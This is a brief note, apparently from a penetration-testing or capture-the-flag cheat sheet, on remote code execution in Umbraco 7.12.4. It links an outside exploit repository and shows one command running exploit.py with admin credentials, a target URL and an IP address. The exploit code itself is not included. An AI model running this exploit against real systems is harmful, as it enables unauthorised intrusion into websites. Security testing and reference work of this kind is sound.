# Umbraco 7.12.4 - RCE

Reference: https://github.com/Jonoans/Umbraco-RCE

```bash
python exploit.py -u admin@example.org -p password123 -w 'http://remote.website/' -i 10.10.10.1
```

[image]
